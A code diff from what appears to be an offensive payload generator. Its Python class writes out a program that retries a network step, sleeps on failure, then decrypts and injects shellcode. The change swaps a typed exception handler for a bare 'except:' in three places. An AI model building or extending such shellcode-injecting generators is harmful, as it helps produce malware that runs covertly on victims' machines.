@@ -178,7 +178,7 @@ class Payload:
                 # Break out to decryption
                 PayloadCode += '   break\n'
                 # At any point it fails you will be in sleep for supplied time
-                PayloadCode += ' except URLError, e:\n'
+                PayloadCode += ' except:\n'
                 PayloadCode += '  time.sleep('+ self.required_options["SLEEP_TIME"][0] +')\n'
                 PayloadCode += '  pass\n'
                 # Execute Shellcode inject
@@ -312,7 +312,7 @@ class Payload:
                 # Break out to decryption
                 PayloadCode += '   break\n'
                 # At any point it fails you will be in sleep for supplied time
-                PayloadCode += ' except URLError, e:\n'
+                PayloadCode += ' except:\n'
                 PayloadCode += '  time.sleep('+ self.required_options["SLEEP_TIME"][0] +')\n'
                 PayloadCode += '  pass\n'
                 # Execute Shellcode inject
@@ -449,7 +449,7 @@ class Payload:
                 # Break out to decryption
                 PayloadCode += '   break\n'
                 # At any point it fails you will be in sleep for supplied time
-                PayloadCode += ' except URLError, e:\n'
+                PayloadCode += ' except:\n'
                 PayloadCode += '  time.sleep('+ self.required_options["SLEEP_TIME"][0] +')\n'
                 PayloadCode += '  pass\n'
                 PayloadCode += RandPadding + ' = \'{\'\n'
